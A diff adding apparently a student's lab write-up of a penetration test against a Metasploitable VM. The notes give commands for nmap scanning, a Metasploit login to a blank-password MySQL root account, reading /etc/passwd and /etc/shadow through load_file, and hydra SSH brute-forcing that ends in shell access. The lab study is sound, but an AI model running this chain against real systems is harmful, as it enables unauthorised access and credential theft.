@@ -1,0 +1,101 @@
+Subdomains:
+www.mthack.me
+mail.mthack.me
+america.mthack.me
+
+using pentest-tools.com
+
+The Hacking Begins
+
+	# nmap 192.168.2.12
+
+See this list of ports:
+Screenshot of portlist
+
+Decide to investigate the mysql port
+
+run:
+	# ncat 192.168.2.12 3306
+Insert screenshot of return info
+
+At this point I was able to install Nessus and started a scan on the VM
+It returned many errors 
+
+There seem to be some MySQL things that popped up during the scan such as:
+MySQL Unpassworded Account Check
+
+So I decided to investigate this a bit more using msfconsole. After starting it up I ran an nmap again 
+	> nmap -sV 192.168.2.12
+
+Again I see that the myswl server is on port 3306 so let's see if we can exploit that at all using msfconsole. I decide to search for mysql to see what is available
+	> search mysql
+
+Since Nessus told us that there is an unpassworded MySQL account I decide to try the mysql_login tool using:
+	> use auxiliary/scanner/mysql/mysql_login
+	> info
+		- This is to see what is possible
+	> set RHOSTS 192.168.2.12
+		- To set the IP we want to log into sql on
+	> set BLANK_PASSWORDS true
+		- Since it set no password was set lets see if it is blank?
+	> exploit
+		- Got output (insert screenshot here)
+
+I see that the version of MySQL is 5.0.51a, will keeep this info in my back pocket to see if there are any exploits for it. Since it looks like there were no solutions, maybe I need to set a username.
+	> set USERNAME root
+		- BOOM! We are in! Insert screenshot (success.png)
+
+Alright now we have confirmed that the root account for mySQL has no password so let's try to login to it.
+	# mysql -h 192.168.2.12 -u root -p
+		- show screenshot here
+
+We are in!!
+	> show grants;
+	> select load_file('/etc/passwd')
+		-Shows me all of the users and their permissions (insert screenshot)
+	> select load_file('/etc/shadow')
+		- Nothing :(
+	> show databases;
+	> use mysql; 
+		- Which was shown as a database
+	> Select *;
+		- Throws error, says I doesn't have a table. So I get the list:
+	> show tables;
+		-See the list of tables includes a user table. Lets check that out!
+	> select * from user;
+		- What a weird print out but it looks like there is a User and password column
+	> select User from user;
+		- Looks like there is a root user, lets check that out
+	> select User, Password from user;
+		- Looks like they don't store the passwords in the database
+
+Lets try the mysql_hashdump tool from msfconsole to see what it does.
+	> set RHOSTS 192.168.2.12
+	> set USERNAME root
+		- No help
+
+Decided to check the sql version to see if there is anyway through it to get into a shell. Doesn't look like anything that I would be willing to pursue.
+
+So I want to try to get the /etc/passwd file onto my machine so I can use it as a username file for bruteforcing the ssh logins.
+	> use auxiliary/admin/mysql/mysql_sql
+		- This allows me to execute sql statements
+		- I grabbed the /etc/passwords file output by using that tool and saved it to my local machine to use as a user file
+
+Lets move to brute forcing the ssh accounts
+	> use auxiliary/scanner/ssh/ssh_login
+		- I set up all the info as expected and use the burnett_top_500.txt password file
+		- I decided to use hydra for password cracking as it seems to be much faster than msfconsole
+	# hydra ssh://192.168.2.12 -L users.txt -P /usr/share/wordlists/metasploit/burnett_top_500.txt -v -t 8
+		- For the purpose of this assignment I decided that it would take too long to test every single user account so I decided to test the "user" user on the metasploitable VM. It was one of the only users with a description so I figured it would be interesting. And it would be more likely to have a simple password if it is an actual human account.
+	# hydra ssh://192.168.2.12 -l user -P /usr/share/wordlists/metasploit/burnett_top_500.txt -v -t 8
+		- no dice
+	# hydra ssh://192.168.2.12 -l user -P /usr/share/wordlists/metasploit/namelist.txt -v -t 8
+		-Success!
+I then login through ssh using the user: user and the password: user
+	# ssh user@192.168.2.12 
+		- Then enter user for the password and boom I am in with shell access.
+
+
+
+
+
